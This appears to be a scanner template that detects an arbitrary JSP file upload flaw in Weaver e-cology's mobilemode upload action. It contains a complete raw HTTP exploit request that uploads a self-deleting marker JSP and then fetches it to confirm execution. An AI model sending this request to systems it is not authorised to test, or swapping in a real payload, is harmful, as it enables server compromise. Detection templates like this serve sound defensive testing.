http:
    - extractors:
        - group: 1
          internal: true
          name: filetext
          part: body
          regex:
            - /mobilemode/upload/images/(.*)','title
          type: regex
      matchers:
        - dsl:
            - status_code_2==200 && contains(body_2, "c12b10120bc9f444afcb64622f38bb21") && contains(header_2, "text/html")
          type: dsl
      matchers-condition: and
      raw:
        - "POST /mobilemode/Action.jsp?invoker=com.weaver.formmodel.mobile.ui.servlet.MobileAppUploadAction&action=image HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryRoL5N5mD7MRNEdNE\nUser-Agent: Mozilla/5.0 \n\n\n------WebKitFormBoundaryRoL5N5mD7MRNEdNE\nContent-Disposition: form-data; name=\"upload\"; filename=\"test.jsp\"\nContent-Type: text/plain\n\n<%\n  out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer(\"YzEyYjEwMTIwYmM5ZjQ0NGFmY2I2NDYyMmYzOGJiMjE=\")));\n  new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\n------WebKitFormBoundaryRoL5N5mD7MRNEdNE--\n"
        - "GET /mobilemode/upload/images/{{filetext}} HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0     \n"
id: fanwei-ecology-action-fileupload
